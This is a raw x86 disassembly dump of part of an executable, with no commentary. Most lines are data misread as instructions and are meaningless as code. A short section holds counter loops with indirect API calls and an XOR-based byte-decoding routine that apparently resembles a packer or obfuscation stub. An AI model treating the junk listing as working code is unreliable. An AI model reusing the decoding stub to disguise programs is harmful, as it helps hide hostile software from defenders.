  40f1f3:	mov    esi,0xb28eb9ca
  40f1f8:	leave  
  40f1f9:	add    al,0xb1
  40f1fb:	pusha  
  40f1fc:	xor    ah,BYTE PTR fs:[ebx+0x26a8e67d]
  40f203:	das    
  40f204:	inc    edi
  40f205:	cld    
  40f206:	and    DWORD PTR [eax+0x27],ebp
  40f209:	or     ch,ah
  40f20b:	rcl    BYTE PTR [ebx+edx*2+0x2b],cl
  40f20f:	nop
  40f210:	in     al,dx
  40f211:	xor    al,0x15
  40f213:	nop
  40f214:	cli    
  40f215:	repz leave 
  40f217:	mov    DWORD PTR [esp+eax*8+0x14b3b22c],ecx
  40f21e:	scas   al,BYTE PTR es:[edi]
  40f21f:	mov    eax,0xe512693a
  40f224:	xchg   edx,eax
  40f225:	jne    0x40f291
  40f227:	aad    0x84
  40f229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f22a:	iret   
  40f22b:	jns    0x40f1ed
  40f22d:	in     eax,0x3c
  40f22f:	in     al,0xfe
  40f231:	dec    ebx
  40f232:	scas   al,BYTE PTR es:[edi]
  40f233:	jmp    0xf5c9:0x7adc0431
  40f23a:	lock fimul WORD PTR [eax+0x47]
  40f23e:	push   ds
  40f23f:	retf   
  40f240:	packuswb mm0,QWORD PTR [ebx-0x3d4f3290]
  40f247:	(bad)  
  40f248:	call   0x3094:0x231f6337
  40f24f:	jne    0x40f1ec
  40f251:	pop    edi
  40f252:	jb     0x40f273
  40f254:	jnp    0x40f1f8
  40f256:	ins    DWORD PTR es:[edi],dx
  40f257:	bound  esp,QWORD PTR [ebx+0x3a4ebcac]
  40f25d:	mov    ds:0xbf0c2e95,al
  40f262:	out    dx,eax
  40f263:	mov    al,ds:0xa5aee19
  40f268:	hlt    
  40f269:	jb     0xb8c92f3a
  40f26f:	sbb    al,0x66
  40f271:	ficomp DWORD PTR [esi-0x78b03a68]
  40f277:	std    
  40f278:	xor    al,0x6a
  40f27a:	dec    edi
  40f27b:	inc    ebp
  40f27c:	call   0x22c4:0x7a0e784a
  40f283:	adc    esi,DWORD PTR ds:0x4efcc61d
  40f289:	(bad)  
  40f28b:	cdq    
  40f28c:	out    dx,eax
  40f28d:	jnp    0x40f2f8
  40f28f:	cwde   
  40f290:	lahf   
  40f291:	mov    esi,0x4c6d2112
  40f296:	ret    
  40f297:	test   BYTE PTR [ebx],0x17
  40f29a:	push   ecx
  40f29b:	sub    al,0xf5
  40f29d:	aas    
  40f29e:	les    ebp,FWORD PTR [ebp-0x3efdbd92]
  40f2a4:	ret    0xfa3
  40f2a7:	loopne 0x40f285
  40f2a9:	cdq    
  40f2aa:	cdq    
  40f2ab:	push   es
  40f2ac:	dec    ecx
  40f2ad:	cmp    BYTE PTR [ebx+0x36],bl
  40f2b0:	push   ecx
  40f2b1:	fld    st(7)
  40f2b3:	xor    al,BYTE PTR ds:0x56b010b5
  40f2b9:	cmp    al,0xe3
  40f2bb:	cli    
  40f2bc:	pop    ss
  40f2bd:	loope  0x40f242
  40f2bf:	sbb    eax,0x6e55cde0
  40f2c4:	xchg   edx,eax
  40f2c5:	cmp    ebx,DWORD PTR [edi-0x26fedfec]
  40f2cb:	dec    ebx
  40f2cc:	dec    ebp
  40f2cd:	call   0xac50:0xa48efca7
  40f2d4:	cmp    esp,edx
  40f2d6:	or     eax,0xc981e1bf
  40f2db:	push   ebx
  40f2dc:	iret   
  40f2dd:	jb     0x40f2fb
  40f2df:	and    dh,bl
  40f2e1:	sbb    eax,0x312307a7
  40f2e6:	mov    ebp,0xc32d2b03
  40f2eb:	add    ch,bl
  40f2ed:	rcl    DWORD PTR [ebx-0x29772fb],0xe
  40f2f4:	jge    0x40f364
  40f2f6:	mov    ds:0x3c460a65,eax
  40f2fb:	sahf   
  40f2fc:	push   0x61
  40f2fe:	or     al,0x41
  40f300:	inc    edx
  40f301:	mov    ecx,esi
  40f303:	sahf   
  40f304:	mov    cs,WORD PTR [ecx-0x3497faf2]
  40f30a:	cmp    DWORD PTR [eax],esi
  40f30c:	xor    ebp,DWORD PTR [edx-0x45]
  40f30f:	xchg   ebp,eax
  40f310:	enter  0x3570,0x3c
  40f314:	idiv   BYTE PTR [esi+0x74]
  40f317:	push   0xffffffa7
  40f319:	(bad)  
  40f31b:	in     al,dx
  40f31c:	xor    eax,0xcbe5b269
  40f321:	sub    al,0xf4
  40f323:	add    eax,0x20eda21c
  40f328:	inc    esi
  40f329:	push   ss
  40f32a:	mov    bh,0x46
  40f32c:	lahf   
  40f32d:	or     al,0x4a
  40f32f:	push   cs
  40f330:	retf   
  40f331:	scas   eax,DWORD PTR es:[edi]
  40f332:	pushf  
  40f333:	popa   
  40f334:	vmread DWORD PTR [ebx-0x19],ecx
  40f338:	cs dec esi
  40f33a:	xchg   ebp,eax
  40f33b:	retf   0x57d7
  40f33e:	enter  0xcd9d,0x22
  40f342:	loope  0x40f350
  40f344:	loop   0x40f38c
  40f346:	rcl    BYTE PTR [edx-0x6c],cl
  40f349:	ja     0x40f379
  40f34b:	data16 cmp al,bh
  40f34e:	mov    edx,0x6bc95707
  40f353:	fiadd  DWORD PTR [edi]
  40f355:	xor    DWORD PTR [esp+edx*1+0x381ac1f1],0xffffffd2
  40f35d:	mov    ds:0xc091173d,eax
  40f362:	or     edx,DWORD PTR [ecx-0x61]
  40f365:	cld    
  40f366:	shl    DWORD PTR [eax+edi*1],1
  40f369:	shl    BYTE PTR [edi+ebx*2-0x5f79c7f4],cl
  40f370:	icebp  
  40f371:	jbe    0x40f3c7
  40f373:	sub    al,0x96
  40f375:	add    bh,BYTE PTR [edi+0x35]
  40f378:	and    ebp,DWORD PTR [ecx-0x6843b118]
  40f37e:	mov    dh,bl
  40f380:	add    edi,edx
  40f382:	mov    eax,0xf89c8531
  40f387:	and    DWORD PTR ds:0x433727,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x433727
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433727,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433727,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433727,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433727
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433727,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433727,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43362b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433703
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433657,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433657,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433657,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433657
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433657,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4336ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4336ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4336ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4336ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4336ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4336ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4336db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4336db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4336db,edx
  40f498:	cmp    DWORD PTR ds:0x4336db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433891
  40f4af:	push   0x4338e7
  40f4b4:	push   0x4338cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4336db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433717
  40f4d2:	adc    DWORD PTR ds:0x433727,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax+0x1d284f39]
  40f540:	mov    ds:0x7e7eacd4,al
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	ds in  al,dx
  40f54b:	pop    ebx
  40f54c:	pop    edi
  40f54d:	jp     0x40f524
  40f54f:	rcr    DWORD PTR [edi],1
  40f551:	pop    esi
  40f552:	xchg   ebx,eax
  40f553:	pop    esp
  40f554:	cld    
  40f555:	js     0x40f57f
  40f557:	or     ebp,DWORD PTR [eax-0x59]
  40f55a:	aas    
  40f55b:	push   ecx
  40f55c:	inc    edi
  40f55d:	jmp    0x257f:0x449e44b0
  40f564:	sbb    DWORD PTR [eax+0x4e],edi
  40f567:	mov    edx,eax
  40f569:	scas   al,BYTE PTR es:[edi]
  40f56a:	jmp    0x40f546
  40f56c:	cmp    edx,edx
  40f56e:	enter  0x9e87,0x65
  40f572:	mov    bh,0x97
  40f574:	ins    BYTE PTR es:[edi],dx
  40f575:	dec    edi
  40f576:	add    al,0xfd
  40f578:	rcl    edi,cl
  40f57a:	int3   
  40f57b:	pop    edx
  40f57c:	xchg   ecx,eax
  40f57d:	retf   
  40f57e:	xchg   ecx,eax
  40f57f:	outs   dx,DWORD PTR ds:[esi]
  40f580:	call   0xfadd:0xfd9b914a
  40f587:	and    DWORD PTR [ebx+eiz*1-0x50],edx
  40f58b:	ret    0x1ef5
  40f58e:	in     eax,0xda
  40f590:	pop    ds
  40f591:	push   ds
  40f592:	out    0x81,eax
  40f594:	popf   
  40f595:	adc    dh,0x89
  40f598:	dec    ebp
  40f599:	lea    esi,[ebp+0x35bd5982]
  40f59f:	ss sahf 
  40f5a1:	mov    eax,DWORD PTR [eax]
  40f5a3:	xor    dl,BYTE PTR [esi+eiz*1-0x3ee66701]
  40f5aa:	dec    edi
  40f5ab:	push   esp
  40f5ac:	xor    ecx,esp
  40f5ae:	mov    ch,0xd1
  40f5b0:	and    esp,DWORD PTR [ebx-0x7f]
  40f5b3:	and    BYTE PTR [ebx-0x1534ec15],0xe3
  40f5ba:	loop   0x40f630
  40f5bc:	and    bh,BYTE PTR [ebp-0x12fe6dc7]
  40f5c2:	retf   
  40f5c3:	and    DWORD PTR [edi],edi
  40f5c5:	btr    DWORD PTR [edx+0x68],ebx
  40f5c9:	fld    st(4)
  40f5cb:	popf   
  40f5cc:	mov    esp,0x8ba43f6e
  40f5d1:	neg    DWORD PTR [edx-0x2c]
  40f5d4:	addr16 push edx
  40f5d6:	pop    ebx
  40f5d7:	out    0x1a,al
  40f5d9:	add    eax,0x26969f93
  40f5de:	adc    eax,0xcb234f0f
  40f5e3:	(bad)  [edx+0x75]
  40f5e6:	gs fucomi st,st(3)
  40f5e9:	mov    ebx,0xd796f466
  40f5ee:	jne    0x40f609
  40f5f0:	xchg   esp,eax
  40f5f1:	pop    ebp
  40f5f2:	mul    ebp
  40f5f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5f5:	adc    ch,BYTE PTR [ecx]
  40f5f7:	sub    BYTE PTR [edx],al
  40f5f9:	popa   
  40f5fa:	sbb    DWORD PTR [edx-0x10],0xfffffff5
  40f5fe:	test   al,al
  40f600:	clc    
  40f601:	cmp    al,0xf7
  40f603:	push   eax
  40f604:	test   al,0x31
  40f606:	ja     0x40f63e
  40f608:	mov    BYTE PTR [edi+0xc8928ba],cl
  40f60e:	and    al,0x8
  40f610:	sub    eax,0x64ca6d2a
  40f615:	(bad)  
  40f617:	ja     0x40f5e4
  40f619:	mov    eax,ds:0xfd6664e3
  40f61e:	fadd   st,st(2)
  40f620:	or     BYTE PTR [edi-0x28375219],0x34
  40f627:	adc    al,0x67
  40f629:	cmp    edx,0x1ee8c4f5
  40f62f:	clc    
  40f630:	cmp    dh,BYTE PTR [ecx]
  40f632:	mul    BYTE PTR [edi-0x32]
  40f635:	je     0x40f658
  40f637:	dec    edx
  40f638:	cmp    dh,bl
  40f63a:	pop    ebp
  40f63b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f63c:	retf   0x3271
  40f63f:	outs   dx,DWORD PTR ds:[esi]
  40f640:	jne    0x40f60c
  40f642:	mov    cl,0xf8
  40f644:	xor    DWORD PTR [edi-0x12],edi
  40f647:	fild   WORD PTR [edi-0x5fc41a7e]
  40f64d:	or     al,0xbf
  40f64f:	xchg   esi,eax
  40f650:	mov    cl,0xd5
  40f652:	fnsave [eax+0x14]
  40f655:	pop    ebx
  40f656:	push   edx
  40f657:	data16 jle 0x40f675
  40f65a:	adc    esp,DWORD PTR [edi]
  40f65c:	pop    edx
  40f65d:	rcl    BYTE PTR [ecx+0x438efc3c],cl
  40f663:	icebp  
  40f664:	fild   DWORD PTR ds:0xba283c32
  40f66a:	test   eax,0xf2e410b5
  40f66f:	mov    ebx,0xd0c46ce7
  40f674:	lds    edx,FWORD PTR [esi-0x6e]
  40f677:	sbb    al,0x7b
  40f679:	inc    ebp
  40f67a:	xchg   DWORD PTR [eax-0x3a888362],ebx
  40f680:	xchg   esp,eax
  40f681:	lock (bad) 
  40f683:	test   edi,0x7e3366c1
  40f689:	ds push es
  40f68b:	(bad)  
  40f68c:	mov    esp,0x406d428a
  40f691:	mov    eax,0x653e7c63
  40f696:	xor    al,0xab
  40f698:	jmp    0xcf119cad
  40f69d:	inc    ebx
  40f69e:	mov    esp,?
  40f6a0:	scas   al,BYTE PTR es:[edi]
  40f6a1:	sbb    eax,0x18314485
  40f6a6:	push   ss
  40f6a7:	sbb    bh,BYTE PTR [edi-0x16]
  40f6aa:	std    
  40f6ab:	test   al,0x4c
  40f6ad:	loope  0x40f6cd
  40f6af:	pop    ecx
  40f6b0:	stos   BYTE PTR es:[edi],al
  40f6b1:	sub    eax,0x8d1b71f8
  40f6b6:	mov    ebx,DWORD PTR [ebp+0x35]
  40f6b9:	lods   eax,DWORD PTR ds:[esi]
  40f6ba:	xor    eax,esp
  40f6bc:	cmp    BYTE PTR [eax],dh
  40f6be:	mul    DWORD PTR [ebp+0x3]
  40f6c1:	stos   DWORD PTR es:[edi],eax
  40f6c2:	(bad)  
  40f6c3:	imul   ebp,eax,0xb66022e9
  40f6c9:	jmp    0xc488:0x635eca80
  40f6d0:	push   cs
  40f6d1:	inc    ecx
  40f6d2:	sahf   
  40f6d3:	push   edx
  40f6d4:	es enter 0xb6fa,0x11
  40f6d9:	xchg   edi,eax
  40f6da:	cmp    DWORD PTR [ecx+ecx*4],edi
  40f6dd:	mov    ss:0x2d81d3ef,eax
  40f6e3:	pop    es
  40f6e4:	sbb    DWORD PTR [ebp+0x4576b9a5],ecx
  40f6ea:	jne    0x40f72a
  40f6ec:	jg     0x40f6eb
  40f6ee:	sbb    ecx,edx
  40f6f0:	push   edi
  40f6f1:	seta   BYTE PTR [eax+0x21b93237]
  40f6f8:	xchg   ecx,eax
  40f6f9:	or     DWORD PTR [eax+eiz*1-0x5f],esi
  40f6fd:	or     DWORD PTR cs:[edi],ecx
  40f700:	repz retf 0x5f
  40f704:	(bad)  
  40f705:	(bad)  
  40f706:	in     eax,0xd9
  40f708:	jmp    0x40f76e
  40f70a:	adc    esi,DWORD PTR [edi-0x8d103d2]
  40f710:	adc    DWORD PTR [eax+0xe3dccb9],ebp
  40f716:	mov    ah,0x1d
  40f718:	js     0x40f762
  40f71a:	jl     0x40f6d2
  40f71c:	dec    ebp
  40f71d:	pusha  
  40f71e:	xchg   edi,eax
  40f71f:	adc    DWORD PTR [ecx+0x34440870],ebx
  40f725:	pop    ebx
  40f726:	jle    0x40f728
  40f728:	fistp  QWORD PTR [edx+eax*2+0x391abeea]
  40f72f:	xchg   ecx,eax
  40f730:	in     eax,dx
  40f731:	out    0xff,eax
  40f733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f734:	enter  0x3874,0xb9
  40f738:	push   cs
  40f739:	std    
  40f73a:	inc    ecx
  40f73b:	pop    esi
  40f73c:	adc    al,0xff
  40f73e:	xchg   esi,eax
  40f73f:	jno    0x40f6c5
  40f741:	or     DWORD PTR [ecx+0x56b90c23],ebp
  40f747:	jbe    0x40f71a
  40f749:	out    0xf2,al
  40f74b:	mov    eax,0xe7754ff0
  40f750:	mov    WORD PTR [ebx+0x1e7ed089],es
  40f756:	mov    edx,0x174313de
  40f75b:	imul   ebx,ebx,0x2c06beae
  40f761:	es mov eax,0x24bb1fab
  40f767:	(bad)  [ebx+0x23]
  40f76a:	lods   al,BYTE PTR ds:[esi]
  40f76b:	mov    eax,ds:0xe44ce0d9
  40f770:	mov    eax,ds:0x4c483438
  40f775:	inc    ebx
  40f776:	dec    esp
  40f777:	in     eax,0xaa
  40f779:	loope  0x40f7df
  40f77b:	push   esp
  40f77c:	jmp    0x52abd32c
  40f781:	xchg   ecx,eax
  40f782:	adc    ah,BYTE PTR [eax+0x4385aa68]
  40f788:	clc    
  40f789:	shl    ebx,1
  40f78b:	sub    ebx,DWORD PTR [ecx]
  40f78d:	iret   
  40f78e:	or     edi,DWORD PTR [esi]
  40f790:	lods   al,BYTE PTR ds:[esi]
  40f791:	stos   BYTE PTR es:[edi],al
  40f792:	aaa    
  40f793:	lods   al,BYTE PTR ds:[esi]
  40f794:	xor    cl,BYTE PTR [esi]
  40f796:	ins    DWORD PTR es:[edi],dx
  40f797:	icebp  
  40f798:	(bad)  
  40f79a:	xchg   BYTE PTR [esi-0x51],dl
  40f79d:	and    dl,BYTE PTR [eax]
  40f79f:	jno    0x40f783
  40f7a1:	outs   dx,BYTE PTR ds:[esi]
  40f7a2:	xor    BYTE PTR [edx+0x33],dh
  40f7a5:	js     0x40f76c
  40f7a7:	out    dx,eax
  40f7a8:	xor    DWORD PTR [esi+0x30035145],esi
  40f7ae:	pop    ebx
  40f7af:	inc    esi
  40f7b0:	and    DWORD PTR [edx],esi
  40f7b2:	inc    ebx
  40f7b3:	call   0x9c60857a
  40f7b8:	cmp    DWORD PTR [edi+ebx*2],ebp
  40f7bb:	fdivr  DWORD PTR [edx+edx*8-0x61]
  40f7bf:	stc    
  40f7c0:	adc    al,0x59
  40f7c2:	(bad)  
  40f7c3:	push   edi
  40f7c4:	out    dx,al
  40f7c5:	in     al,dx
  40f7c6:	xor    ebp,esi
  40f7c8:	push   0xd86ad0c3
  40f7cd:	or     ebp,eax
  40f7cf:	mov    ah,0xd4
  40f7d1:	shl    DWORD PTR [eax+0x179dbd8d],1
  40f7d7:	bound  edx,QWORD PTR [edi+0x6e]
  40f7da:	pop    esi
  40f7db:	mov    ds:0xc1566b9b,eax
  40f7e0:	mov    fs,edi
  40f7e2:	jp     0x40f7a1
  40f7e4:	outs   dx,BYTE PTR ds:[esi]
  40f7e5:	pop    edi
  40f7e6:	jae    0x40f824
  40f7e8:	dec    esi
  40f7e9:	or     al,0x14
  40f7eb:	mov    eax,ds:0xcd89999a
  40f7f0:	jecxz  0x40f79c
  40f7f2:	aad    0xb9
  40f7f4:	jns    0x40f847
  40f7f6:	or     BYTE PTR [eax-0x5d6d8bc0],0x26
  40f7fd:	jp     0x40f7d8
  40f7ff:	jmp    0x6228:0x91888055
  40f806:	in     eax,0x33
  40f808:	mov    ds:0x769e2498,al
  40f80d:	ss arpl bx,cx
  40f810:	mov    esp,0xf3d2f4a9
  40f815:	add    esi,esp
  40f817:	test   BYTE PTR [esi+0x16],0xef
  40f81b:	clc    
  40f81c:	inc    ebx
  40f81d:	in     al,0xeb
  40f81f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f820:	or     al,0x57
  40f822:	mov    eax,ds:0xb6fb6591
  40f827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f828:	jecxz  0x40f860
  40f82a:	mov    ecx,0x9473ad72
  40f82f:	dec    ecx
  40f830:	rcl    BYTE PTR [ebx],0xd8
  40f833:	jp     0x40f853
  40f835:	jmp    0x57e28ebf
  40f83a:	jno    0x40f7c9
  40f83c:	pop    edi
  40f83d:	push   esi
  40f83e:	add    esp,DWORD PTR [ecx+0x27]
  40f841:	jne    0x40f8b0
  40f843:	test   DWORD PTR [esi],edi
  40f845:	add    BYTE PTR [esi*8+0x3362fd51],bh
  40f84c:	stc    
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0x2f2ca33f
  40f897:	fcmovbe st,st(2)
  40f899:	stos   DWORD PTR es:[edi],eax
  40f89a:	jle    0x40f91a
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	cmp    eax,0x70cf6254
  40f8a5:	adc    BYTE PTR [edi],al
  40f8a7:	and    al,0xa7
  40f8a9:	mov    BYTE PTR ds:0x24d80977,ch
  40f8af:	xchg   edx,eax
  40f8b0:	pop    eax
  40f8b1:	add    bl,dh
  40f8b3:	pop    ecx
  40f8b4:	es addr16 dec esp
  40f8b7:	adc    DWORD PTR [eax],0xcbc8a92a
  40f8bd:	lods   eax,DWORD PTR ds:[esi]
  40f8be:	(bad)  
  40f8bf:	cmc    
  40f8c0:	cmc    
  40f8c1:	jge    0x40f93e
  40f8c3:	add    eax,0x4de8271c
  40f8c8:	not    DWORD PTR [ecx+ebp*2-0x969977f]
  40f8cf:	cmp    BYTE PTR [edi+0xd],ch
  40f8d2:	sub    BYTE PTR [ecx-0x6f],dl
  40f8d5:	test   eax,0x8439b959
  40f8da:	mov    ah,0x5e
  40f8dc:	pop    edx
  40f8dd:	inc    ebx
  40f8de:	sbb    esp,DWORD PTR [ebp-0x178e6334]
  40f8e4:	daa    
  40f8e5:	push   esi
  40f8e6:	data16 loopne 0x40f90c
  40f8e9:	cmp    esi,DWORD PTR [edx+0x2a3ce5cf]
  40f8ef:	sbb    al,0xd8
  40f8f1:	jle    0x40f8da
  40f8f3:	out    dx,eax
  40f8f4:	loopne 0x40f958
  40f8f6:	imul   edx,DWORD PTR [edx+0x28],0x28deaf4d
  40f8fd:	push   ss
  40f8fe:	push   esi
  40f8ff:	pop    ebp
  40f900:	cmp    DWORD PTR [ebx+0x35],ecx
  40f903:	pop    edx
  40f904:	mov    DWORD PTR [eax+ecx*1+0x67e7c6b3],0xdf9e3813
  40f90f:	adc    esp,0xe963cc5d
  40f915:	stos   DWORD PTR es:[edi],eax
  40f916:	(bad)
  40f919:	mov    bh,0x48
  40f91b:	xor    al,0xdf
  40f91d:	ja     0x40f953
  40f91f:	jge    0x40f8e3
  40f921:	adc    al,0x28
  40f923:	mov    dl,bl
  40f925:	xor    dx,WORD PTR [ecx+0x6b]
  40f929:	jl     0x40f996
  40f92b:	into   
  40f92c:	lock inc ebp
  40f92e:	arpl   WORD PTR [eax-0xe],ax
  40f931:	xor    bl,dl
  40f933:	xchg   ecx,eax
  40f934:	test   eax,0x4e61b7c1
  40f939:	iret   
  40f93a:	in     eax,dx
  40f93b:	mov    esp,0x5c84c5f7
  40f940:	jb     0x40f8cd
  40f942:	ja     0x40f9ad
  40f944:	mov    BYTE PTR [edi],ch
  40f946:	push   edx
  40f947:	xor    ebp,DWORD PTR [edx]
  40f949:	fadd   DWORD PTR [ebx-0x4875b9b3]
  40f94f:	ror    DWORD PTR [edi],0x60
  40f952:	pop    ds
  40f953:	xchg   ebx,eax
  40f954:	loope  0x40f9b0
  40f956:	push   ecx
  40f957:	dec    esi
  40f958:	add    al,0xab
  40f95a:	in     eax,0x2c
  40f95c:	ds jb  0x40f8e3
  40f95f:	dec    esp
  40f960:	mov    edi,0xba5e1307
  40f965:	ror    BYTE PTR [edx+edx*2-0x2d],0xdd
  40f96a:	cmc    
  40f96b:	call   0x16fb:0x54956c2e
  40f972:	jle    0x40f9cc
  40f974:	pushf  
  40f975:	sbb    eax,0x8c6b71f4
  40f97a:	and    al,0xe7
  40f97c:	mov    ebp,esi
  40f97e:	push   edx
  40f97f:	hlt    
  40f980:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f981:	imul   ebx,DWORD PTR [edx+0x45a0d2d2],0xffffffa7
  40f988:	sub    ch,BYTE PTR [eax]
  40f98a:	jg     0x40f9ad
  40f98c:	xchg   esi,eax
  40f98d:	jo     0x40f92c
  40f98f:	scas   al,BYTE PTR es:[edi]
  40f990:	mov    ds:0x880fd506,al
  40f995:	inc    edi
  40f996:	add    BYTE PTR [esi-0x6e495eee],dh
  40f99c:	or     eax,0xa7385c56
  40f9a1:	enter  0x534e,0x4c
  40f9a5:	scas   eax,DWORD PTR es:[edi]
  40f9a6:	jecxz  0x40f93d
  40f9a8:	xor    ah,BYTE PTR [ecx+eax*8+0x10b22ba5]
  40f9af:	mov    bh,0xb
  40f9b1:	pop    ss
  40f9b2:	and    eax,0x25bb40d1
  40f9b7:	or     eax,DWORD PTR [ecx]
  40f9b9:	sub    DWORD PTR [ebp+0x40423ff6],ebx
  40f9bf:	(bad)  
  40f9c0:	cmp    al,0xf1
  40f9c2:	stos   DWORD PTR es:[edi],eax
  40f9c3:	pop    es
  40f9c4:	test   dl,ch
  40f9c6:	aam    0x16
  40f9c8:	in     eax,0x4c
  40f9ca:	ins    BYTE PTR es:[edi],dx
  40f9cb:	sub    BYTE PTR [eax-0x12],al
  40f9ce:	cwde   
  40f9cf:	lock cmp esp,DWORD PTR [eax-0x5f2479e3]
  40f9d6:	dec    eax
  40f9d7:	pusha  
  40f9d8:	mov    eax,ds:0x51b96c3f
  40f9dd:	das    
  40f9de:	outs   dx,DWORD PTR ds:[esi]
  40f9df:	ins    DWORD PTR es:[edi],dx
  40f9e0:	mov    dh,0x6c
  40f9e2:	popa   
  40f9e3:	sub    eax,0x8d3937d7
  40f9e8:	loopne 0x40f9ce
  40f9ea:	stos   BYTE PTR es:[edi],al
  40f9eb:	outs   dx,BYTE PTR ds:[esi]
  40f9ec:	mov    ah,0x9b
  40f9ee:	pushw  cs
  40f9f0:	jmp    0xfef21668
  40f9f5:	mov    ?,WORD PTR [eax+0x612ad611]
  40f9fb:	dec    ebx
  40f9fc:	inc    ecx
  40f9fd:	data16 lahf 
  40f9ff:	adc    DWORD PTR [eax+edi*8+0x3255a151],ebp
  40fa06:	xchg   BYTE PTR [edx],ah
  40fa08:	shl    DWORD PTR [edi+0x56ce8bb7],1
  40fa0e:	pop    es
  40fa0f:	aad    0xd9
  40fa11:	xor    edx,DWORD PTR [ecx*8+0x22638cc6]
  40fa18:	xor    al,0x40
  40fa1a:	sar    edx,1
  40fa1c:	and    DWORD PTR [edx],esp
  40fa1e:	mov    al,ds:0x6cf8074b
  40fa23:	and    eax,0xc3b5ae80
  40fa28:	mov    BYTE PTR [ebx+0x4f09b06],0x83
  40fa2f:	in     al,dx
  40fa30:	hlt    
  40fa31:	leave  
  40fa32:	ror    DWORD PTR [eax],0x2e
  40fa35:	add    ecx,DWORD PTR gs:[ebx]
  40fa38:	repnz xchg ebx,esi
  40fa3b:	stos   DWORD PTR es:[edi],eax
  40fa3c:	cmp    BYTE PTR [esi],dl
